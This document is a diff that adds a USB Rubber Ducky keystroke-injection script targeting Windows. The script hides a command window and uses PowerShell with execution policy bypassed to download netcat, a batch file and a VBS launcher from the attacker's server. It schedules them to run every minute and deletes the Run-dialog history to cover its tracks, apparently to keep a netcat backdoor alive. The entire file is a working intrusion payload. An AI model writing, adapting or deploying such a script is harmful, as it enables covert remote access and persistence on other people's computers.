@@ -1,0 +1,35 @@
+DELAY 1000
+GUI d
+DELAY 100
+GUI r
+DELAY 100
+REM [we obfuscate the cmd]
+STRING cmd /K color FE&mode con:cols=18 lines=1
+ENTER
+DELAY 100
+REM [download the netcat from my apache server]
+STRING cd / & mkdir SystemDucky & cd SystemDucky & echo (wget 'http://[::PUBLIC::IP::]/nc.exe' -OutFile run.exe) > ducky.ps1 & powershell -ExecutionPolicy ByPass -File ducky.ps1
+ENTER
+DELAY 1000
+REM [download from my apache server the script that contains the execution command that is used to boot netcat]
+STRING echo (wget 'http://[::PUBLIC::IP::]/start.bat' -OutFile start.bat) > ducky.ps1 & powershell -ExecutionPolicy ByPass -File ducky.ps1
+ENTER
+DELAY 1000
+REM [download from my server apache the script that is responsible for executing the start.bat in background]
+STRING echo (wget 'http://[::PUBLIC::IP::]/script.vbs' -OutFile script.vbs) > ducky.ps1 & powershell -ExecutionPolicy ByPass -File ducky.ps1
+ENTER
+DELAY 1000
+REM [schedules the script file to run every 1 minutes (change the number 1 to a different time if you need)]
+STRING schtasks /create /tn TaskSystem /tr C:/SystemDucky/script.vbs /sc minute /mo 1
+ENTER
+DELAY 50
+REM [delete unnecessary files]
+STRING del ducky.ps1
+ENTER
+DELAY 50
+REM [we delete footprints in the windows r]
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+DELAY 50
+STRING start.bat & exit
+ENTER
